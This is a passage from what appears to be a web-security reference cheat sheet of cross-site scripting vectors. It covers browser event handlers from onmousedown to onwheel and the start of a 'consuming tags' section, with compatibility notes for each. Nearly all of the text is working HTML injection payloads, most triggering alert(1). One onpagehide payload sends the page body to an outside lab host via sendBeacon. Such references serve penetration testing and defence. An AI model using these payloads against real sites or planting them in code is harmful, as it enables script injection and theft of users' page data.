style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onmousedown%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmousedown)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmouseenter\n\nTriggered when the mouse is hovered over the element\n\n [`<xss onmouseenter=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onmouseenter%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmouseenter)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmouseleave\n\nTriggered when the mouse is moved away from the element\n\n [`<xss onmouseleave=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onmouseleave%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmouseleave)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmousemove\n\nRequires mouse movement\n\n [`<xss onmousemove=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onmousemove%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmousemove)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmouseout\n\nTriggered when the mouse is moved away from the element\n\n [`<xss onmouseout=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onmouseout%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmouseout)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmouseover\n\nRequires a hover over the element\n\n [`<xss onmouseover=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onmouseover%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmouseover)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmouseup\n\nTriggered when the mouse button is released\n\n [`<xss onmouseup=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onmouseup%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmouseup)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmousewheel\n\nFires when the mousewheel scrolls\n\n [`<xss onmousewheel=alert(1) style=display:block>requires scrolling`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onmousewheel%3Dalert%281%29%20style%3Ddisplay%3Ablock%3Erequires%20scrolling&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmousewheel)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmozfullscreenchange\n\nFires when a video changes full screen status\n\n [`<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>`](https://portswigger-labs.net/xss/xss.php?x=%3Cvideo%20onmozfullscreenchange%3Dalert%281%29%20src%3Dvalidvideo.mp4%20controls%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmozfullscreenchange)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpagehide\n\nFires when the page is changed\n\n [`<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onpagehide%3Dnavigator.sendBeacon%28%27%2F%2Fhttps%3A%2F%2Fssl.portswigger-labs.net%2F%27%2Cdocument.body.innerHTML%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpagehide)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpaste\n\nRequires you paste a piece of text\n\n [`<a onpaste=\"alert(1)\" contenteditable>test</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpaste)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpause\n\nRequires clicking the element to pause\n\n [`<audio autoplay controls onpause=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20autoplay%20controls%20onpause%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpause)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointercancel\n\nYou need to make a selection and drag the text using a laptop touchpad.\n\n [`<xss onpointercancel=alert(1)>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointercancel%3Dalert%281%29%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointercancel)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointerdown\n\nFires when the mouse down\n\n [`<xss onpointerdown=alert(1) style=display:block>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointerdown%3Dalert%281%29%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointerdown)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointerenter\n\nFires when the mouseenter\n\n [`<xss onpointerenter=alert(1) style=display:block>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointerenter%3Dalert%281%29%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointerenter)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointerleave\n\nFires when the mouseleave\n\n [`<xss onpointerleave=alert(1) style=display:block>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointerleave%3Dalert%281%29%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointerleave)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointermove\n\nFires when the mouse move\n\n [`<xss onpointermove=alert(1) style=display:block>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointermove%3Dalert%281%29%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointermove)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointerout\n\nFires when the mouse out\n\n [`<xss onpointerout=alert(1) style=display:block>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointerout%3Dalert%281%29%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointerout)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointerover\n\nFires when the mouseover\n\n [`<xss onpointerover=alert(1) style=display:block>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointerover%3Dalert%281%29%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointerover)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointerrawupdate\n\nFires when the pointer changes\n\n [`<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointerrawupdate%3Dalert%281%29%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointerrawupdate)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpointerup\n\nFires when the mouse up\n\n [`<xss onpointerup=alert(1) style=display:block>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onpointerup%3Dalert%281%29%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpointerup)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonratechange\n\nFires when the speed of the video changes\n\n [`<audio controls autoplay onratechange=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20controls%20autoplay%20onratechange%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onratechange)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonreset\n\nRequires a click\n\n [`<form onreset=alert(1)><input type=reset>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%20onreset%3Dalert%281%29%3E%3Cinput%20type%3Dreset%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onreset)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonsearch\n\nFires when a form is submitted and the input has a type attribute of search\n\n [`<form><input type=search onsearch=alert(1) value=\"Hit return\" autofocus>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20type%3Dsearch%20onsearch%3Dalert%281%29%20value%3D%22Hit%20return%22%20autofocus%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onsearch)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonseeked\n\nRequires clicking the element timeline\n\n [`<audio autoplay controls onseeked=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20autoplay%20controls%20onseeked%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onseeked)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonseeking\n\nRequires clicking the element timeline\n\n [`<audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20autoplay%20controls%20onseeking%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onseeking)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonselect\n\nRequires you select text\n\n [`<input onselect=alert(1) value=\"XSS\" autofocus>`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20onselect%3Dalert%281%29%20value%3D%22XSS%22%20autofocus%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onselect)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonselectionchange\n\nFires when text selection is changed on the page\n\n [`<body onselectionchange=alert(1)>select some text`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onselectionchange%3Dalert%281%29%3Eselect%20some%20text&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onselectionchange)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonselectstart\n\nFires when beginning a text selection\n\n [`<body onselectstart=alert(1)>select some text`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onselectstart%3Dalert%281%29%3Eselect%20some%20text&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onselectstart)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonshow\n\nFires context menu is shown\n\n [`<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>`](https://portswigger-labs.net/xss/xss.php?x=%3Cdiv%20contextmenu%3Dxss%3E%3Cp%3ERight%20click%3Cmenu%20type%3Dcontext%20id%3Dxss%20onshow%3Dalert%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onshow)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonsubmit\n\nRequires a form submission\n\n [`<form onsubmit=alert(1)><input type=submit>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%20onsubmit%3Dalert%281%29%3E%3Cinput%20type%3Dsubmit%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onsubmit)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontoggle(popover)\n\nFires when the a popop element is toggled\n\n [`<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbutton%20popovertarget%3Dx%3EClick%20me%3C%2Fbutton%3E%3Cxss%20ontoggle%3Dalert%281%29%20popover%20id%3Dx%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontoggle\\(popover\\))\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontouchend\n\nFires when the touch screen, only mobile device\n\n [`<body ontouchend=alert(1)> `](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20ontouchend%3Dalert%281%29%3E%20&context=html) \n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontouchend)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontouchmove\n\nFires when the touch screen and move, only mobile device\n\n [`<body ontouchmove=alert(1)> `](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20ontouchmove%3Dalert%281%29%3E%20&context=html) \n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontouchmove)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontouchstart\n\nFires when the touch screen, only mobile device\n\n [`<body ontouchstart=alert(1)> `](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20ontouchstart%3Dalert%281%29%3E%20&context=html) \n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontouchstart)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonvolumechange\n\nRequires volume adjustment\n\n [`<audio autoplay controls onvolumechange=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20autoplay%20controls%20onvolumechange%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onvolumechange)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitmouseforcechanged\n\nRequires a click from a laptop touchpad.\n\n [`<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onwebkitmouseforcechanged%3Dalert%281%29%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitmouseforcechanged)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitmouseforcedown\n\nRequires a click from a laptop touchpad.\n\n [`<xss onwebkitmouseforcedown=alert(1)>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onwebkitmouseforcedown%3Dalert%281%29%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitmouseforcedown)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitmouseforceup\n\nRequires a click from a laptop touchpad.\n\n [`<xss onwebkitmouseforceup=alert(1)>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onwebkitmouseforceup%3Dalert%281%29%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitmouseforceup)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitmouseforcewillbegin\n\nRequires a click from a laptop touchpad.\n\n [`<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onwebkitmouseforcewillbegin%3Dalert%281%29%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitmouseforcewillbegin)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitwillrevealbottom\n\nRequires a click from a laptop touchpad.\n\n [`<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onwebkitwillrevealbottom%3Dalert%281%29%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitwillrevealbottom)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwheel\n\nFires when you use the mouse wheel\n\n [`<body onwheel=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onwheel%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwheel)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nConsuming tags\n--------------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nNoembed consuming tag\n\n[`<noembed><img title=\"</noembed><img src onerror=alert(1)>\"></noembed>`](https://portswigger-labs.net/xss/xss.php?x=%3Cnoembed%3E%3Cimg%20title%3D%22%3C%2Fnoembed%3E%3Cimg%20src%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fnoembed%3E&context=html)\n\n ![Copy vector to 